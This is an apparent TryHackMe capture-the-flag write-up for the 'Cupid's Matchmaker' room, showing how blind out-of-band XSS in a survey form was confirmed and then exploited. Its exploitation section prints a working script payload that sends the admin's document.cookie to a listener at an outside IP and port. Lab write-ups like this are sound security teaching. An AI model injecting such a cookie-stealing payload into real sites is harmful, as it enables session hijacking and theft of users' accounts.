---
title: "Cupid's Matchmaker - TryHackMe"
date: 2026-04-05 02:00:00 +0000
categories: [TryHackMe, Writeups]
tags: [oob, xss, blind-xss, cookie]
image: /assets/img/writeups/covers/cupids-matchmaker.png
---
# Cupid’s Matchmaker – TryHackMe
![1.png](/assets/img/writeups/cupids-matchmaker/1.png)
**Platform:** TryHackMe<br>**Difficulty:** Easy<br>**Category:** Web Application
## Overview
[Cupid’s Matchmaker](https://tryhackme.com/room/lafb2026e3) is a beginner-friendly web challenge focused on client-side vulnerabilities, particularly Cross-Site Scripting (XSS). The objective is to identify an injection point and leverage it to capture sensitive data.
## Initial Exploration
After logging in, a matchmaking web application was presented. During enumeration, an endpoint `/survey` was discovered containing multiple input fields for user interaction.

![1.png](/assets/img/writeups/cupids-matchmaker/6.png)

Basic testing was performed across common vulnerability classes:

- **Reflected / Stored XSS**  — Payloads submitted, no direct output or reflection observed
- **Out-of-Band XSS** — Further discovery performed using an external callback to detect blind execution

Since traditional XSS attempts failed, Out-of-Band (OOB) XSS was tested using `interact.sh`. This successfully triggered an external callback, confirming that the application was vulnerable to OOB XSS.
![1.png](/assets/img/writeups/cupids-matchmaker/2.png)
![1.png](/assets/img/writeups/cupids-matchmaker/3.png)


## Exploitation

To exploit the vulnerability, a payload was crafted to capture data from the admin’s browser context and send it to a listener:
````
<script>new Image().src='http://192.168.146.174:1234/log?c=' + document.cookie;</script>
````

A listener was started on port 1234 to capture incoming requests. After the payload was injected, it executed in the admin’s context and sent the data to the listener.

![1.png](/assets/img/writeups/cupids-matchmaker/4.png)
![1.png](/assets/img/writeups/cupids-matchmaker/5.png)

The captured request contained the required flag, which was successfully exfiltrated from the admin’s browser context.
